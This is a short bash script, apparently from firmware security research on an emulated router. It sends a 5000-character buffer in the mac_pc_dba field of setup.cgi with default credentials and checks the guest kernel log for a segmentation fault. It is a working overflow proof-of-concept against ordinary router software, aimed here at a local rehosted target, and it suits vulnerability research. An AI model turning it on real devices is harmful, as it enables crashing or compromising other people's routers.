#!/bin/bash
TARGET=${TARGET:-http://127.0.0.1:16358}
AUTH=${AUTH:-admin:password}
SOCK=<rehost-dir>
guest(){ (printf "%s\n" "$1"; sleep 2) | socat -t 8 - UNIX-CONNECT:$SOCK 2>/dev/null | tr -d '\r'; }
[ -f /tmp/e5000.txt ] || python3 -c "print('E'*5000)" > /tmp/e5000.txt
PAYLOAD=$(cat /tmp/e5000.txt)

for TODO in update_pcdb add_apcdb; do
 echo "=== todo=$TODO + mac_pc_dba=5000E ==="
 guest "dmesg -c > /dev/null" >/dev/null
 curl -s -u "$AUTH" --max-time 25 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=$TODO" \
 --data-urlencode "h_ip_type=fixed" --data-urlencode "h_mac_type=fixed" \
 --data-urlencode "h_pcdb_list=-1" --data-urlencode "c4_add_IP=192.168.1.99" \
 --data-urlencode "add_pc_name=x" --data-urlencode "next_file=pc_dba.htm" \
 --data-urlencode "mac_pc_dba=$PAYLOAD"
 sleep 2
 guest "dmesg" | grep -E "setup.cgi|epc|SIGSEGV" | tail -4
done
